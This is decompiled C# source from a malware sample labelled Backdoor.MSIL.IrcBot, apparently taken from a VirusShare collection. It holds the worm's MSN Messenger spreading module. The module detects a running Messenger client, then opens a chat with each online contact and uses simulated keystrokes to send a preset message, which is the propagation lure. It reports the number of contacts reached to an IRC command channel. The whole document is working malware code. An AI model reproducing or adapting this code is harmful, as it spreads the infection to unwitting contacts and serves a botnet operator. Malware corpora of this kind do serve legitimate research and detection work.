// Decompiled with JetBrains decompiler
// Type: myApp.Msnspread
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using MSNMessengerAPI;
using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace myApp
{
  internal class Msnspread
  {
    public static string MYmessage;

    public void MsnStart()
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains("msnmsgr"))
        {
          try
          {
            Program.Registar_Dlls(Environment.CurrentDirectory + "\\MSNMessengerAPI.dll");
          }
          catch
          {
          }
          try
          {
            Msnspread.MsnSend();
            Thread.Sleep(2000);
          }
          catch
          {
          }
        }
      }
    }

    public static void MsnSend()
    {
      try
      {
        Messenger messenger = (Messenger) new MessengerClass();
        if (((object) ((IMSNMessenger3) messenger).MyStatus).Equals((object) "MISTATUS_OFFLINE"))
          return;
        IMSNMessengerContacts myContacts = (IMSNMessengerContacts) ((IMSNMessenger3) messenger).MyContacts;
        int num = 0;
        foreach (IMSNMessengerContact messengerContact in myContacts)
        {
          if (messengerContact.Status != 1)
          {
            try
            {
              ((IMSNMessenger3) messenger).InstantMessage((object) messengerContact);
              SendKeys.SendWait(Msnspread.MYmessage);
              Thread.Sleep(500);
              SendKeys.SendWait("{ENTER}");
              Thread.Sleep(1000);
              SendKeys.SendWait("{ESCAPE}");
              Thread.Sleep(10000);
              ++num;
            }
            catch
            {
            }
          }
        }
        if (num == 0)
          return;
        Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  \u00038Message sent to " + (object) num + " contacts");
      }
      catch
      {
      }
    }
  }
}
